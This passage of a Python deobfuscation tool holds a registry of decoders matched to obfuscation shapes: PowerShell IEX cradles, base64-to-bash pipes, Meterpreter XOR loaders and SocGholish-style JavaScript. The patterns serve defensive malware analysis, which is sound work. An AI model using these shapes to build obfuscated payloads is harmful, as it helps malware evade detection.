        "description": "Node.js Buffer.from(<b64>,'base64') + zlib.gunzipSync — SocGholish-style",
        "chain": ["extract-b64", "gzip-decompress"],
        "handler": _handle_js_buffer_gunzip,
        "match":   lambda t: bool(_JS_BUFFER_GUNZIP_RX.search(t) or _JS_BUFFER_GUNZIP_LOOSE_RX.search(t)),
    },
    {
        "id": "VBS_CHR_CONCAT",
        "description": "VBScript Chr(N)&Chr(N)&… character-code concatenation (macro dropper)",
        "chain": ["chr-decode"],
        "handler": _handle_vbs_chr_concat,
        "match":   lambda t: bool(_VBS_CHR_CONCAT_RX.search(t)),
    },
    {
        "id": "PS_EncodedCommand",
        "description": "PowerShell -Enc / -EncodedCommand CLI flag (base64 → UTF-16LE or UTF-8 script)",
        "chain": ["extract-b64", "utf16le-or-utf8-decode"],
        "handler": _handle_ps_enc_cli,
        "match":   lambda t: bool(_PS_ENC_CLI_RX.search(t)),
    },
    {
        "id": "PS_MemoryStream_Gzip_IEX",
        "description": "PowerShell IO.MemoryStream + GzipStream + IEX (Empire/Cobalt one-liner)",
        "chain": ["extract-b64", "base64-gzip"],
        "handler": _handle_ps_memstream_gzip,
        "match":   lambda t: bool(_PS_MEMSTREAM_GZIP_RX.search(t)),
    },
    {
        "id": "PS_MemoryStream_Deflate_IEX",
        "description": "PowerShell IO.MemoryStream + DeflateStream + IEX",
        "chain": ["extract-b64", "base64-zlib"],
        "handler": _handle_ps_memstream_deflate,
        "match":   lambda t: bool(_PS_MEMSTREAM_DEFLATE_RX.search(t)),
    },
    {
        "id": "PS_FROMBASE64_ASCII_FROMHEX",
        "description": "PowerShell nested chain: FromBase64String → ASCII.GetString → FromHexString → ASCII.GetString (Feb 2026).",
        "chain": ["extract-b64", "ascii-decode", "hex-decode", "ascii-decode"],
        "handler": _handle_ps_b64_hex_ascii,
        "match":   lambda t: _ps_b64_hex_ascii_matches(t),
        "terminal": True,
    },
    {
        "id": "PS_FromBase64String_UTF16LE",
        "description": "PowerShell FromBase64String + Encoding.Unicode.GetString (UTF-16LE)",
        "chain": ["extract-b64", "utf16le-decode"],
        "handler": _handle_ps_fb64_utf16,
        "match":   lambda t: bool(_PS_FB64_UTF16_RX.search(t)),
    },
    {
        "id": "PS_FromBase64String_ASCII",
        "description": "PowerShell FromBase64String + Encoding.ASCII.GetString (Feb 2026 fix — was mis-classified as UTF-16LE).",
        "chain": ["extract-b64", "ascii-decode"],
        "handler": _handle_ps_fb64_ascii,
        "match":   lambda t: bool(_PS_FB64_ASCII_RX.search(t)),
    },
    {
        "id": "Bash_base64_gunzip_pipe",
        "description": "Bash: echo <b64> | base64 -d | gunzip [| bash]",
        "chain": ["extract-b64", "base64-gzip"],
        "handler": _handle_bash_b64_gunzip,
        "match":   lambda t: bool(_BASH_B64_GUNZIP_RX.search(t)),
    },
    {
        "id": "Bash_base64_pipe_bash",
        "description": "Bash: echo <b64> | base64 -d | bash",
        "chain": ["extract-b64", "base64-decode"],
        "handler": _handle_bash_b64_pipe,
        "match":   lambda t: bool(_BASH_B64_PIPE_RX.search(t)),
    },
    {
        "id": "Node_Buffer_from_gunzip",
        "description": "Node.js: Buffer.from(<b64>,'base64') + zlib.gunzipSync",
        "chain": ["extract-b64", "base64-gzip"],
        "handler": _handle_node_buf_gunzip,
        "match":   lambda t: bool(_NODE_BUF_GUNZIP_RX.search(t)),
    },
    {
        "id": "PS_FromBase64String_GzipStream_generic",
        "description": "Generic PowerShell FromBase64String + GzipStream (order-insensitive)",
        "chain": ["extract-b64", "base64-gzip"],
        "handler": _handle_generic_b64_gzip,
        "match":   lambda t: bool(_GENERIC_B64_GZIP_RX.search(t)),
    },
    {
        "id": "PS_MSF_XOR_Stage2",
        "description": "Metasploit/Meterpreter PowerShell reflective loader ($var_code + -bxor + reflective PEB walker) — recovers raw shellcode bytes",
        "chain": ["extract-b64", "base64-decode", "xor"],
        "handler": _handle_ps_msf_xor_stage2,
        "match":   lambda t: _msf_loader_matches(t),
    },
    {
        "id": "PS_ASCII_XOR_IEX",
        "description": "PowerShell (int,int,...) | ForEach [char]($_ -bxor <k>) -join '' | IEX — recovers the original PowerShell script",
        "chain": ["ascii-decimal-decode", "xor"],
        "handler": _handle_ps_ascii_xor_iex,
        "match":   lambda t: _ps_ascii_xor_iex_matches(t),
    },
    {
        "id": "PS_ASCII_DECIMAL_JOIN",
        "description": "PowerShell (int,int,...) | ForEach [char]$_ | Join-String / -join '' — non-XOR ASCII decimal decode",
        "chain": ["ascii-decimal-decode"],
        "handler": _handle_ps_ascii_decimal_join,
        "match":   lambda t: _ps_ascii_decimal_join_matches(t),
    },
    {
        "id": "JS_STRING_FROMCHARCODE",
        "description": "JavaScript String.fromCharCode(int,int,...) — recovers the inner JS/HTML string (SocGholish, Fake-Update injects)",
        "chain": ["js-charcode-decode"],
        "handler": _handle_js_fromcharcode,
        "match":   lambda t: _js_fromcharcode_matches(t),
    },
    {
        "id": "PS_BINARY_SPLIT_TOINT16",
        "description": "PowerShell '<binary+junk>'.Split(delims) | ForEach{[Convert]::ToInt16($_, 2/10/16) -As[Char]} — Invoke-Obfuscation binary/hex-array shape",
        "chain": ["ps-binary-split-decode"],
        "handler": _handle_ps_binary_split,
        "match":   lambda t: _ps_binary_split_matches(t),
    },
    # ── PowerShell string-concatenation IEX ────────────────────────────
    # Shape:   $c=('Inv'+'oke'+'-Ex'+'pression'); & $c ...
    #         (('IE'+'X') -join '')
    #         "{1}{0}" -f 'X','IE'
    # Recovers the JOINED plaintext token(s).
    {
        "id": "PS_STRING_CONCAT",
        "description": "PowerShell 'Inv'+'oke'+'-Ex'+'pression' style concatenation — recovers the joined string.",
        "chain": ["ps-string-concat"],
        "handler": lambda t: _handle_ps_string_concat(t),
        "match":   lambda t: _ps_string_concat_matches(t),
    },
    # ── PowerShell -join (single-char array or split-then-join) ─────────
    # Shape:   ('I','E','X') -join ''
    #          [char[]](73,69,88) -join ''
    {
        "id": "PS_JOIN_CHAR_ARRAY",
        "description": "PowerShell ('c1','c2',...) -join '' or [char[]](NN,NN,...) -join '' — recovers the joined string.",
        "chain": ["ps-join-char-array"],
        "handler": lambda t: _handle_ps_join_char_array(t),
        "match":   lambda t: _ps_join_char_array_matches(t),
    },
    # ── PowerShell -f (format-operator) obfuscation ────────────────────
    # Shape:   "{1}{0}" -f 'X','IE'  → 'IEX'
    {
        "id": "PS_FORMAT_OPERATOR",
        "description": "PowerShell -f format-operator obfuscation (\"{i}{j}\" -f 'X','IE') — recovers the assembled string.",
        "chain": ["ps-format-op"],
        "handler": lambda t: _handle_ps_format_op(t),
        "match":   lambda t: _ps_format_op_matches(t),
    },
    # ── PowerShell reverse-string obfuscation ───────────────────────────
    # Shape:  -join ('noisserpxE-ekovnI'[-1..-17])
    {
        "id": "PS_REVERSE_STRING",
        "description": "PowerShell -join ('<reversed>'[-1..-N]) — recovers the reversed string.",
        "chain": ["reverse"],
        "handler": lambda t: _handle_ps_reverse_string(t),
        "match":   lambda t: _ps_reverse_string_matches(t),
    },
    # ── Batch %var:~x,y% substring extraction ───────────────────────────
    # Shape:  @set v=REALLYLONG_SECRET_VALUE
    #         @call echo %v:~7,6%      → "SECRET"
    {
        "id": "BATCH_VAR_SLICE",
        "description": "Batch %var:~x,y% substring extraction — recovers the sliced substring.",
        "chain": ["batch-var-slice"],
        "handler": lambda t: _handle_batch_var_slice(t),
        "match":   lambda t: _batch_var_slice_matches(t),
    },
    # ─── Feb 2026 Research-backed archetypes ────────────────────────────
    # Source: /app/memory/RESEARCH_REFERENCES.md
    #   Bohannon US-17 · Deep Instinct 2025 · dr4k0nia 2022
    {
        "id": "PS_TICK_OBFUSC",
        "description": "PowerShell backtick-per-char obfuscation (Bohannon US-17) — strips `X between letters.",
        "chain": ["strip-ticks"],
        "handler": lambda t: _handle_ps_tick_obfusc(t),
        "match":   lambda t: _ps_tick_obfusc_matches(t),
    },
    {
        "id": "CMD_ENVVAR_SPLIT_POWERSHELL",
        "description": "CMD `set p1=power && set p2=shell && %p1%%p2%` env-var recombination (Bohannon/FIN8).",
        "chain": ["cmd-env-resolve"],
        "handler": lambda t: _handle_cmd_envvar_split(t),
        "match":   lambda t: _cmd_envvar_split_matches(t),
    },
    {
        "id": "PS_GET_COMMAND_WILDCARD",
        "description": "PowerShell `& (GCM *w-O*)` wildcard cmdlet resolve (Bohannon) — annotates target.",
        "chain": ["gcm-wildcard-annotate"],
        "handler": lambda t: _handle_ps_gcm_wildcard(t),
        "match":   lambda t: _ps_gcm_wildcard_matches(t),
        "terminal": True,
    },
    {
        "id": "PS_SPLIT_JOIN_DELIM",
        "description": "PowerShell '<body>'.Split('~~') -Join '' delimiter obfuscation (Bohannon).",
        "chain": ["split-join-delim"],
        "handler": lambda t: _handle_ps_split_join(t),
        "match":   lambda t: _ps_split_join_matches(t),
    },
    {
        "id": "PS_REPLACE_JUNK",
        "description": "PowerShell '<body>'.Replace('~~','')  or  -Replace '~~','' junk-char removal (Bohannon).",
        "chain": ["replace-junk"],
        "handler": lambda t: _handle_ps_replace_junk(t),
        "match":   lambda t: _ps_replace_junk_matches(t),
    },
    {
        "id": "PS_ARRAY_REVERSE_JOIN",
        "description": "PowerShell [Array]::Reverse($chars) + -Join '' string reversal (Bohannon).",
        "chain": ["array-reverse-join"],
        "handler": lambda t: _handle_ps_array_reverse_join(t),
        "match":   lambda t: _ps_array_reverse_join_matches(t),
        "terminal": True,
    },
    {
        "id": "PS_REGEX_REVERSE",
        "description": "PowerShell [RegEx]::Matches($x,'.','RightToLeft') string reversal (Bohannon).",
        "chain": ["regex-reverse"],
        "handler": lambda t: _handle_ps_regex_reverse(t),
        "match":   lambda t: _ps_regex_reverse_matches(t),
    },
    {
        "id": "PS_SCRIPTBLOCK_CREATE",
        "description": "PowerShell [Scriptblock]::Create('<code>') string→scriptblock conversion (Bohannon).",
        "chain": ["scriptblock-create"],
        "handler": lambda t: _handle_ps_scriptblock_create(t),
        "match":   lambda t: _ps_scriptblock_create_matches(t),
    },
    {
        "id": "PS_CLIPBOARD_IEX",
        "description": "PowerShell [Clipboard]::GetText() → IEX cradle (Bohannon) — annotates only.",
        "chain": ["clipboard-cradle-annotate"],
        "handler": lambda t: _handle_ps_clipboard_iex(t),
        "match":   lambda t: _ps_clipboard_iex_matches(t),
        "terminal": True,
    },
    {
        "id": "EXCEL_REGEX_OBFUSC",
        "description": "Excel REGEXEXTRACT / REGEXREPLACE VBA obfuscation (Deep Instinct 2025) — annotates.",
        "chain": ["excel-regex-annotate"],
        "handler": lambda t: _handle_excel_regex_obfusc(t),
        "match":   lambda t: _excel_regex_obfusc_matches(t),
        "terminal": True,
    },
    {
        "id": "DOTNET_HOMOGLYPH_REPLACE",
        "description": ".NET MurkyStrings-style homoglyph strings + .Replace() at runtime (dr4k0nia).",
        "chain": ["homoglyph-normalise"],
        "handler": lambda t: _handle_dotnet_homoglyph(t),
        "match":   lambda t: _dotnet_homoglyph_matches(t),
    },
    {
        "id": "DOTNET_STRING_REMOVE",
        "description": ".NET MurkyStrings-style chained .Remove(i,l) noise-name stripping (dr4k0nia) — annotates.",
        "chain": ["dotnet-remove-annotate"],
        "handler": lambda t: _handle_dotnet_string_remove(t),
        "match":   lambda t: _dotnet_string_remove_matches(t),
        "terminal": True,
    },
    # ─── Feb 2026 · Batch-CSV-row fixes ─────────────────────────────
    {
        "id": "PS_BASE64_XOR_BYTE_IEX",
        "description": "PowerShell FromBase64String + per-byte -bxor <key> + GetString + IEX (Feb 2026).",
        "chain": ["extract-b64", "xor-byte", "ascii-decode"],
        "handler": _handle_ps_b64_xor_iex,
        "match":   lambda t: _ps_b64_xor_iex_matches(t),
        "terminal": True,
    },
    {
        "id": "PS_SAL_ALIAS_RESOLVER",
        "description": "PowerShell `sal <alias> <cmdlet>` alias expansion (Feb 2026).",
        "chain": ["expand-alias"],
        "handler": _handle_ps_sal_alias,
        "match":   lambda t: _ps_sal_alias_matches(t),
        "terminal": True,
    },
    {
        "id": "PS_ENVVAR_METHOD_CHAIN",
        "description": "CMD `set a=Down&set b=load...` + PS `$env:a$env:b$env:c(...)` method-name chain (Feb 2026).",
        "chain": ["cmd-set-collect", "env-ref-resolve"],
        "handler": _handle_ps_envvar_method_chain,
        "match":   lambda t: _ps_envvar_method_chain_matches(t),
        "terminal": True,
    },
    # ─── Feb 2026 · Native / LOLBAS command explainer (fallback) ───────
    # Fires ONLY on plain-text LOLBAS commands so the OUTPUT panel does
    # more than just echo the raw command back. Terminal by design.
    {
        "id": "NATIVE_CMD_EXPLAINER",
        "description": "Plain-text LOLBAS / native command → GoogleAI-style structured breakdown (Action/Source/Target/Flags + MITRE/Risk).",
        "chain": ["native-cmd-explain"],
        "handler": lambda t: _handle_native_cmd_explainer(t),
        "match":   lambda t: _native_cmd_explainer_matches(t),
        "terminal": True,
    },
]


def try_archetypes(text: str, max_depth: int = 4) -> Optional[Dict[str, Any]]:
    """Try every archetype in registry order; return the FIRST successful decode.

    ── Chaining (Stage-1 → Stage-2 → …) ────────────────────────────────────
    After the first successful archetype fires, its OUTPUT is fed back into
    the registry to see if another archetype matches (e.g. a PS gzip stager
    unwraps to a Meterpreter XOR-loader, which unwraps to raw shellcode).
    Chaining continues until no archetype matches OR `max_depth` is reached.

    The returned dict contains the DEEPEST terminal output, plus:
      • `chain_ids` — ordered list of archetype IDs that fired
      • `chain_steps` — concatenated op steps across every stage
      • `engine` — "archetype:<first>+<second>+…" for full traceability

    Returns None if no archetype matched at the top level.
    """
    fired: List[Dict[str, Any]] = []
    current = text
    # Feb-2026 fix — resolve `$var='literal'` assignments so archetype
    # regexes that expect a string literal inside FromBase64String(...)
    # can match payloads that use variable indirection (a very common
    # real-world obfuscation shape). This is a pure lexical rewrite and
    # therefore safe to apply once at the top of the loop.
    try:
        resolved = resolve_ps_variables(current)
        if resolved and resolved != current:
            current = resolved
    except Exception:
        pass
    for _ in range(max_depth):
        matched = False
        hit_terminal = False
        for arch in ARCHETYPES:
            try:
                if not arch["match"](current):
                    continue
                out = arch["handler"](current)
                if isinstance(out, str) and out.strip() and out != current:
                    fired.append({"id": arch["id"], "desc": arch["description"],
                                  "chain": arch["chain"], "output": out,
                                  "terminal": bool(arch.get("terminal"))})
                    current = out
                    matched = True
                    hit_terminal = bool(arch.get("terminal"))
                    break
            except Exception:
                continue
        if not matched or hit_terminal:
            break

    if not fired:
        return None

    ids   = [f["id"] for f in fired]
    steps = []
    for f in fired:
        steps.extend([{"op": s, "args": {}} for s in f["chain"]])
    return {
        "output": fired[-1]["output"],
        "engine": "archetype:" + "+".join(ids),
        "steps":  steps,
        "score":  1.0,
        "reached_shellcode": False,   # analysis_core re-checks against prologues
        "notes":  [f"Matched named wrapper archetype: {f['desc']}" for f in fired],
        "archetype_id":   ids[-1],
        "archetype_desc": fired[-1]["desc"],
        "chain_ids":      ids,
        # Feb-2026 — propagate terminal flag so the outer recursive wrapper
        # does not re-enter (would clobber a forensic-report output like
        # CERTUTIL_DECODE_PEM's hexdump with a smart/magic re-extract).
        "terminal_archetype": any(f.get("terminal") for f in fired),
    }
